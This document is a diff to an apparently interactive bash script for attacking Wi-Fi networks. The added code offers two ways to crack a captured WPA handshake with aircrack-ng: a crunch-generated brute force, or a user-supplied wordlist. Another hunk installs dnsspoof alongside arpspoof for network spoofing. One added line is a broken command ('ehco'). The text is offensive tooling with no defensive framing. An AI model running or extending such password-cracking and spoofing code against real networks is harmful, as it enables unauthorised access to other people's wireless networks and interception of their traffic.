@@ -316,17 +316,39 @@ read -p 'security : ' apsec
  echo  - aircrack-ng -
  echo ------------------
  echo
+ echo  " n : no  or y : yes"
+ echo
+ read -p 'wordlist : ' wordw
  echo
  echo
  echo
  echo
  echo
- echo
- echo
- crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $apbssid -a wpa $filecap1-01.cap
- echo
- echo
- clear
+    if [ $wordw = "n" ]
+    then
+    crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $apbssid -a wpa $filecap1-01.cap
+    echo
+    echo
+    fi
+    
+    if [ $wordw = "y" ]
+    then
+    echo
+    echo -e  '\e[1;33m '
+    echo wordlist
+    echo
+    echo
+    echo
+    echo -e  '\e[1;31m '
+    echo
+    read -p 'wordlist : ' wordcrack
+    echo
+    echo
+    ehco
+    aircrack-ng -w $wordcrack -b $apbssid -a wpa $filecap1-01.cap
+    fi
+    
+    
  fi
 fi
 
@@ -409,6 +431,8 @@ apt install arpspoof
 apt-get install arpspoof
 apt install nslookup
 apt-get install nslookup
+apt-get install dnsspoof
+apt install dnsspoof 
 clear
 echo '[end]'
 fi
